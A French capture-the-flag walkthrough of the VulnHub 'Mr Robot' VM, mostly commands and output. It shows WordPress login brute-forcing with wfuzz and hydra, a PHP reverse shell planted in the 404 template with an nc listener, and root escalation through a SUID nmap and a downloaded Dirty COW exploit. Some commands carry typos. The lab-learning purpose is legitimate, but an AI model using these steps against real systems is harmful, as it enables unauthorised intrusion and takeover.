Vulhub :
https://www.vulnhub.com/entry/mr-robot-1,151/

Writeup :
https://securitybytes.io/mr-robot-a-vulnerable-vm-story-f18ac952c9df


Phase 1 : information gathering récolte d'information :

Découverte de l'adresse IP :
netdiscover -i <carte réseau> ici eth0
172.16.151.128


Phase 2 :scan de l'adresse IP :
oot@DebSec:~/Documents/MrRobot# nmap -sC 172.16.151.128

Starting Nmap 7.60 ( https://nmap.org ) at 2017-09-14 16:32 EDT
Nmap scan report for 172.16.151.128
Host is up (0.0013s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http
|_http-title: Site doesn't have a title (text/html).
443/tcp open   https
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
MAC Address: 00:0C:29:02:FF:C9 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 17.70 seconds

Phase 3 : scan du site web :

root@DebSec:~# nikto -h http://172.16.151.128
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          172.16.151.128
+ Target Hostname:    172.16.151.128
+ Target Port:        80
+ Start Time:         2017-09-14 15:21:13 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/5.5.29
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x29 0x52467010ef8ad 
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.php
+ OSVDB-3092: /admin/: This might be interesting...
+ Uncommon header 'link' found, with contents: <http://172.16.151.128/?p=23>; rel=shortlink
+ /readme.html: This WordPress file reveals the installed version.
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /admin/index.html: Admin login page/section found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login/: Admin login page/section found.
+ /wordpress/: A Wordpress installation was found.
+ /wp-admin/wp-login.php: Wordpress login found
+ /blog/wp-login.php: Wordpress login found
+ /wp-login.php: Wordpress login found
+ 7535 requests: 0 error(s) and 18 item(s) reported on remote host
+ End Time:           2017-09-14 15:25:52 (GMT-4) (279 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

On ouvre la page de login de wp-login.php et on regarde le code source :
<p>
		<label for="user_login">Username<br/>
		<input type="text" name="log" id="user_login" aria-describedby="login_error" class="input" value="Elliot" size="20"/></label>
	</p>
	<p>
		<label for="user_pass">Password<br/>
		<input type="password" name="pwd" id="user_pass" aria-describedby="login_error" class="input" value="" size="20"/></label>
	</p>
		<p class="forgetmenot"><label for="rememberme"><input name="rememberme" type="checkbox" id="rememberme" value="forever"/> Remember Me</label></p>
	<p class="submit">
		<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In"/>
		<input type="hidden" name="redirect_to" value="http://172.16.151.128/wp-admin/"/>
		<input type="hidden" name="testcookie" value="1"/>
	</p>
</form>

deux chose importante :
champ login = log
champ password = pwd


Phase 4 : tous les sites web ont un robots.txt :

root@DebSec:~# curl http://172.16.151.128/robots.txt
User-agent: *
fsocity.dic
key-1-of-3.txt

Phase 5 : on récupère les fichiers pour les lire :

root@DebSec:~/Documents/MrRobot# curl -O http://172.16.151.128/key-1-of-3.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    33  100    33    0     0     33      0  0:00:01 --:--:--  0:00:01  3666

root@DebSec:~/Documents/MrRobot# curl -O http://172.16.151.128/fsocity.dic
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 7075k  100 7075k    0     0  7075k      0  0:00:01 --:--:--  0:00:01 26.4M

On jette un oeil sur ce que contiennent les fichiers et on réduit le contenu du fichier fsociety.dic qui semble être un dictionnaire : 
mv fsociety.dic fsociety.dic.ORIG
cat fsocity.dic.ORIG | sort | uniq > fsocity2.dic


Phase 6 : après le scan Nikto on a vu qu'il y avait une page de login wp :
on va faire un wfuzz pour voir le login on va se servir d'un des fichiers downloader

wfuzz -c -z file,/root/Documents/MrRobot/fsocity.dic -- hs Invalid -d “log=FUZZ&pwd=aaaaa” http://172.16.151.128/wo-login.php

Explication :
    -c : couleur
    -z : payload/wordlist
   -- hs : ignore les réponse contenant Invalid
    -d : la requête POST
    FUZZ : la section dans la requête POST que je veux fuzzer

********************************************************
* Wfuzz 2.1.5 - The Web Bruteforcer                      *
********************************************************

Target: http://172.16.151.128/wp-login.php
Total requests: 858160

==================================================================
ID	Response   Lines      Word         Chars          Request    
==================================================================

00009:  C=200     58 L	     194 W	   3663 Ch	  "Elliot"
02024:  C=200     58 L	     194 W	   3663 Ch	  "elliot"
08968:  C=200     58 L	     194 W	   3663 Ch	  "ELLIOT"
11408:  C=200     58 L	     194 W	   3663 Ch	  "Elliot"
13464:  C=200     58 L	     194 W	   3663 Ch	  "elliot"

donc on a maintenant un login, on peut faire le fuzz du password :

soit avec wpscan :
wpscan -u http://172.16.151.128/ --wordlist /root/Documents/MrRobot/fsocity.dic --username elliot
très très long !!!!

Soit avec wfuzz :
wfuzz -c -z file,/root/Documents/MrRobot/fsocity.dic --hs incorrect -d “log=eliott&pwd=FUZZ” http://1172.16.151.128/wo-login.php 
cette fois ignore les page incorrect et on fuzz sur le password.

* Wfuzz 2.1.5 - The Web Bruteforcer                      *
********************************************************

Target: http://172.16.151.128/wp-login.php
Total requests: 11451

==================================================================
ID	Response   Lines      Word         Chars          Request    
==================================================================

05583:  C=302      0 L	       0 W	      0 Ch	  "ER28-0652"

Total time: 457.4098
Processed Requests: 11451
Filtered Requests: 11450
Requests/sec.: 25.03444

En une seule ligne on peut faire les deux en se servant du même dico :
wfuzz -c -z file,/root/Documents/MrRobot/fsoc.dic -z file,/root/Documents/MrRobot/fsoc.dic --hs Invalid --hs incorrect -d “log=FUZZ&pwd=FUZ2Z” http://192.168.240.129/wp-login.php


Phase 7 : un webshell sur le site c pas mal ça
ON va chercher un reverse shell ici :
http://pentestmonkey.net/tools/web-shells/php-reverse-shell

On utilise la page 404 du WP...

On met en écoute le serveur de l'attaquant :
nc -lvp 3344

On ajuste le phpshell (en début du fichier avec les bon paramètres : adresse IP dde l'attaqaunt et le port) :
On trouve le mot de passe de user robot abcdefghijklmnopqrstuvwxyz

On lance un prompt via la commande :
python -c “import pty; pty.spawn(‘/bin/bash’);”

une fois sur le prompt on lance une recherche sur les fichier avec une perm 4000 (donc suid en root) :

find / -perm -u=s -type f 2>/dev/null

on obtient une liste avec entre autre un nmap, cool !!! car on sait que'il y a une faille facile avec nmap

on lance alors :
nmap --interactive
nmap>!sh
!sh
# id
id
et bim on est root, on se balade et on trouve la dernière clef. 

==================================================================
Créer une wordlist depuis un site web : 
cewl -w mrrobot_user.txt -d 1 -m 6 http://www.usanetwork.com/mrrobot/cast

Le meilleur :
root@GB-BXBT-1900:~/MrRobot# wfuzz -c -v -z file,/root/MrRobot/test_tier2.txt -z file,/root/MrRobot/test_passwd.txt -d "log=FUZZ&pwd=FUZ2Z" --sc 302  http://10.0.1.104/wp-login 
********************************************************
* Wfuzz 2.1.3 - The Web Bruteforcer                      *
********************************************************

Target: http://10.0.1.104/wp-login
Total requests: 81


==============================================================================================================================================
ID	C.Time   Response   Lines      Word         Chars                  Server                                             Redirect   Request    
==============================================================================================================================================

00033:  0.322s   C=302      0 L	       0 W	      0 Ch                Apache                          http://10.0.1.104/wp-admin/   "elliot - ER28-0652"
..."
00042:  0.290s   C=302      0 L	       0 W	      0 Ch                Apache                          http://10.0.1.104/wp-admin/   "Elliot - ER28-0652"
..."

Total time: 1.803464
Processed Requests: 81
Filtered Requests: 79
Requests/sec.: 44.91354

root@GB-BXBT-1900:~/MrRobot# 






Brute force avec hydra :
hydra -L fsocity.dic.uniq -p pass 10.0.1.104 http-form-post "/wp-login.php:log=^USER&pwd=^PASS:Invalid"
ou
hydra -v -L fsocity.dic.uniq -p pass 10.0.1.104 http-form-post "/wp-login:log=^USER^&pwd=^PASS^:F=Invalid username"

root@DebSec:~/Documents/Challenge/VulnHub/MrRobot# hydra -L fsocity.dic.uniq -p whocares 10.0.1.104 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid"
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-02-04 18:41:52
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:11452/p:1), ~716 tries per task
[DATA] attacking http-post-form://10.0.1.104:80//wp-login.php:log=^USER^&pwd=^PASS^:Invalid




[STATUS] 285.00 tries/min, 285 tries in 00:01h, 11167 to do in 00:40h, 16 active
[STATUS] 283.67 tries/min, 851 tries in 00:03h, 10601 to do in 00:38h, 16 active

[STATUS] 285.43 tries/min, 1998 tries in 00:07h, 9454 to do in 00:34h, 16 active
[STATUS] 284.27 tries/min, 4264 tries in 00:15h, 7188 to do in 00:26h, 16 active
[80][http-post-form] host: 10.0.1.104   login: elliot   password: pass
[80][http-post-form] host: 10.0.1.104   login: Elliot   password: pass
[80][http-post-form] host: 10.0.1.104   login: ELLIOT   password: pass

daemon@linux:/$ find / -perm 4755 -type f 2>/dev/null
find / -perm 4755 -type f 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/pt_chown

https://www.exploit-db.com/download/40847.cpp
daemon@linux:/$ /usr/local/bin/nmap --interactive
/usr/local/bin/nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# id
id
uid=1(daemon) gid=1(daemon) euid=0(root) groups=0(root),1(daemon)
# whoami
whoami
root
# pwd
pwd
/
# wget https://www.exploit-db.com/download/40847.cpp
wget https://www.exploit-db.com/download/40847.cpp
--2018-02-04 19:53:51--  https://www.exploit-db.com/download/40847.cpp
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [application/txt]
Saving to: '40847.cpp'

    [ <=>                                   ] 10,531      --.-K/s   in 0.002s  

2018-02-04 19:53:52 (6.69 MB/s) - '40847.cpp' saved [10531]

# g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
# ls
ls
40847.cpp  dcow  home	     lib64	 mnt   root  srv  usr
bin	   dev	 initrd.img  lost+found  opt   run   sys  var
boot	   etc	 lib	     media	 proc  sbin  tmp  vmlinuz
# chmod 755 dcow
chmod 755 dcow
# ./dcow
./dcow
Running ...
Received su prompt (Password: )
Root password is:   dirtyCowFun
Enjoy! :-)
# su -
su -
Password: dirtyCowFun

root@linux:~# ifconfig
ifconfig
eth0      Link encap:Ethernet  HWaddr 00:0c:29:bb:6f:9e  
          inet addr:10.0.1.104  Bcast:10.0.1.255  Mask:255.255.255.0
          inet6 addr: fe80::20c:29ff:febb:6f9e/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:17359596 errors:22 dropped:32 overruns:0 frame:0
          TX packets:1777196 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:1186383840 (1.1 GB)  TX bytes:1231671055 (1.2 GB)
          Interrupt:18 Base address:0x2000 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:3301 errors:0 dropped:0 overruns:0 frame:0
          TX packets:3301 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:5269948 (5.2 MB)  TX bytes:5269948 (5.2 MB)

root@linux:~# netstat -tlnpaue
netstat -tlnpaue
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode       PID/Program name
tcp        0      0 127.0.0.1:21            0.0.0.0:*               LISTEN      0          9105        1612/vsftpd     
tcp        0      0 127.0.0.1:2812          0.0.0.0:*               LISTEN      0          10519       2394/monit      
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      1001       1792        2157/mysqld.bin 
tcp        0      0 10.0.1.104:40565        10.0.1.102:4444         ESTABLISHED 1          1878528     4453/php-fpm: pool 
tcp6       0      0 :::443                  :::*                    LISTEN      0          9958        2247/httpd.bin  
tcp6       0      0 :::80                   :::*                    LISTEN      0          9948        2247/httpd.bin  
udp        0      0 0.0.0.0:16843           0.0.0.0:*                           0          9684        1564/dhclient   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           0          10295       1564/dhclient   
udp6       0      0 :::20490                :::*                                0          9685        1564/dhclient   

